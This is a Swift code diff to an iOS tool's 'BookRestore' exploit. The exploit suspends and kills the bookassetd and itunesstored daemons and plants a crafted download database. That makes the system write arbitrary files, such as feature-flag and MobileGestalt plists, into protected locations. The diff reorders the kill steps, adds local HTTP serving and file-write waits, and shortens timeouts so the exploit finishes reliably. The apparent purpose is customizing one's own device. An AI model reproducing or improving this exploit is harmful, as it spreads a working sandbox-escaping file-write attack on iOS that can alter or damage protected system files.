@@ -142,8 +142,8 @@ enum BookRestoreApplyTask {
             }
         }
         
-        // For Custom files, push to Media folder via AFC
-        for file in files where file.fileType == .custom {
+        // For Custom, FeatureFlags, and Placeholder files, push to Media folder via AFC
+        for file in files where file.fileType == .custom || file.fileType == .featureFlags || file.fileType == .placeholder {
             if let contents = file.contents {
                 let fileName = (file.targetPath as NSString).lastPathComponent
                 try context.afcPushData(contents, toPath: fileName)
@@ -157,9 +157,9 @@ enum BookRestoreApplyTask {
             }
         }
         
-        // CRITICAL FIX #1: Pause bookassetd with SIGSTOP (signal 19) BEFORE uploading DB
-        // This prevents bookassetd from reading the old DB while we're uploading
-        // IMPORTANT: Keep it paused until AFTER itunesstored processes (matching Nugget line 360-422)
+        // Pause bookassetd with SIGSTOP (signal 19) BEFORE uploading DB
+        // This prevents bookassetd from reading the old DB while we're uploading.
+        // It will be SIGKILL'd immediately after the upload — before killing itunesstored.
         ApplyLogger.shared.log("=== BookRestore Exploit Started ===")
         ApplyLogger.shared.log("Total files to apply: \(files.count)")
         onLogUpdate?("Starting BookRestore exploit with \(files.count) file(s)")
@@ -188,6 +188,17 @@ enum BookRestoreApplyTask {
         ApplyLogger.shared.log("✓ Database uploaded successfully (bookassetd still paused)")
         onLogUpdate?("✓ Database uploaded")
         
+        // Kill bookassetd NOW — DB is safely uploaded so bookassetd is no longer needed in paused state.
+        // This matches Nugget's order (line ~405): SIGKILL bookassetd BEFORE killing itunesstored.
+        // If bookassetd stays paused (SIGSTOP) while we kill itunesstored, itunesstored restarts and
+        // tries to queue the download to bookassetd — which never responds — causing itunesstored to
+        // block and the "Install complete... result: Failed" message to never be emitted (120s hang).
+        if let pid = pid_bookassetd {
+            try context.killProcess(withPID: pid, signal: SIGKILL)
+            ApplyLogger.shared.log("✓ Killed bookassetd (PID: \(pid)) after DB upload")
+            onLogUpdate?("✓ Killed bookassetd")
+        }
+        
         // Kill itunesstored to trigger download (Nugget line 407-408)
         ApplyLogger.shared.log("Killing itunesstored to trigger processing...")
         processes = try getRunningProcesses()
@@ -199,20 +210,19 @@ enum BookRestoreApplyTask {
         
         // Wait for itunesstored to process the download (Nugget line 410-417)
         // This is where we wait for "Install complete... result: Failed"
-        ApplyLogger.shared.log("Waiting for itunesstored to process database (timeout: 120s)...")
+        // Reduced timeout to 25s — with bookassetd dead, itunesstored processes quickly.
+        ApplyLogger.shared.log("Waiting for itunesstored to process database (timeout: 25s)...")
         onLogUpdate?("Waiting for itunesstored to process database...")
-        let itunestoredSuccess = try await waitForItunesstored(timeout: 120, onLogUpdate: onLogUpdate)
+        let itunestoredSuccess = try await waitForItunesstored(timeout: 25, onLogUpdate: onLogUpdate)
         ApplyLogger.shared.log("✓ itunesstored processing complete: \(itunestoredSuccess)")
         onLogUpdate?("✓ itunesstored processing complete")
         
-        // NOW kill bookassetd and Books (Nugget line 419-424)
-        // This happens AFTER itunesstored finishes
-        ApplyLogger.shared.log("Killing bookassetd and Books after itunesstored success...")
+        // Kill any newly-spawned bookassetd/Books before opening Books fresh (Nugget line 419-424)
+        ApplyLogger.shared.log("Killing any residual bookassetd and Books...")
         processes = try getRunningProcesses()
         if let pid = processes.first(where: { $0.value?.hasSuffix(ObfuscatedPaths.bookassetdProcess) == true })?.key {
             try context.killProcess(withPID: pid, signal: SIGKILL)
-            ApplyLogger.shared.log("✓ Killed bookassetd (PID: \(pid)) after itunesstored")
-            onLogUpdate?("✓ Killed bookassetd")
+            ApplyLogger.shared.log("✓ Killed residual bookassetd (PID: \(pid))")
         }
         if let pid = processes.first(where: { $0.value?.hasSuffix(ObfuscatedPaths.booksProcess) == true })?.key {
             try context.killProcess(withPID: pid, signal: SIGKILL)
@@ -225,29 +235,19 @@ enum BookRestoreApplyTask {
         LSApplicationWorkspaceDefaultWorkspace().openApplication(withBundleID: "com.apple.iBooks")
         ApplyLogger.shared.log("✓ Books app launched")
         
-        // CRITICAL FIX: LocalHost mode with HTTP server (Nugget line 432-446)
-        // After itunesstored succeeds, device automatically downloads files via HTTP
-        // We just need to wait for downloads to complete
-        ApplyLogger.shared.log("=== HTTP Download Phase Started ===")
-        ApplyLogger.shared.log("LocalHost mode: Device will download \(files.count) file(s) via HTTP")
-        ApplyLogger.shared.log("HTTP server should be serving files at this point")
-        ApplyLogger.shared.log("Expected behavior: Device sends HEAD then GET requests for each file")
-        onLogUpdate?("Waiting for device to download files via HTTP...")
+        // Wait for bookassetd to finish writing all files (Nugget line 432-463, LocalHost mode)
+        // Nugget waits for "[Install-Mgr]: Marking download as [finished]" × fileCount times,
+        // with a 20-second timeout for LocalHost mode.
+        // Without this wait, the 5-second fixed sleep was too short: bookassetd had not finished
+        // writing files before the respring, so Feature Flags (and other tweaks) never took effect.
+        let bookrestoreFileCount = files.filter { $0.fileType != .placeholder }.count
+        ApplyLogger.shared.log("Waiting for bookassetd to finish writing \(bookrestoreFileCount) file(s) (timeout: 20s)...")
+        onLogUpdate?("Waiting for bookassetd to write files...")
+        _ = try await waitForBookassetdFinished(fileCount: bookrestoreFileCount, timeout: 20, onLogUpdate: onLogUpdate)
+        ApplyLogger.shared.log("✓ bookassetd file-write phase complete")
         
-        // Give device time to download files via HTTP (observed in Nugget logs: ~3-5 seconds for multiple files)
-        // Nugget logs show: HEAD request -> GET request for each file
-        ApplyLogger.shared.log("Waiting 5 seconds for HTTP downloads...")
-        for i in 1...5 {
-            try await Task.sleep(nanoseconds: 1_000_000_000)  // 1 second
-            ApplyLogger.shared.log("HTTP download wait: \(i)/5 seconds elapsed")
-            onLogUpdate?("Downloading files: \(i)/5 seconds")
-        }
-        
-        ApplyLogger.shared.log("✓ HTTP download wait complete (5 seconds elapsed)")
         ApplyLogger.shared.log("=== BookRestore Exploit Completed ===")
         onLogUpdate?("✓ BookRestore exploit completed successfully")
-        ApplyLogger.shared.log("Exploit verification: BookRestore completed with HTTP download mode")
-        ApplyLogger.shared.log("Files should now be applied to device at: /var/mobile/Library/Caches/TelephonyUI-10/")
         ApplyLogger.shared.log("Apply operation completed successfully")
         
         // End logging session and save to file
@@ -545,8 +545,14 @@ enum BookRestoreApplyTask {
         let attrData = try loadZFileAttributes()
         
         // Insert a row for each file
+        // NOTE: Skip placeholder files - they are only used for folder creation via AFC
+        // and should NOT be inserted into ZBLDOWNLOADINFO. Including them causes
+        // itunesstored to hang because it tries to process dummy URLs (e.g. robots.txt)
         var zPK = 0
         for file in files {
+            if file.fileType == .placeholder {
+                continue
+            }
             zPK += 1
             
             let zassetPath: String
@@ -592,8 +598,20 @@ enum BookRestoreApplyTask {
                 let fileName = file.localFileName ?? (file.targetPath as NSString).lastPathComponent
                 zplistPath = "/var/mobile/Media/\(fileName)"
                 
-                // URL can be a dummy (we push file via AFC to Media folder)
-                zurl = "https://www.google.com/robots.txt"
+                // URL selection for ZAssetPath mode:
+                // - featureFlags: its plist is written to Documents and served by the local HTTP
+                //   server, so use http://localhost to let itunesstored download it instantly on-device.
+                //   Using an external dummy URL (robots.txt) would cause itunesstored to make an
+                //   outbound network request that can hang, preventing "Install complete" from firing.
+                // - Other ZAssetPath files (e.g. MobileGestalt): content is only in the AFC Media
+                //   folder (not served via local HTTP), so a dummy external URL is required.
+                //   Note: localhost is always plain HTTP (no certificate needed) — consistent with
+                //   other LocalHost-mode URLs in this file.
+                if file.fileType == .featureFlags {
+                    zurl = "http://localhost:\(Utils.port)/\(fileName)"
+                } else {
+                    zurl = "https://www.google.com/robots.txt"
+                }
             }
             
             // Build SQL insert
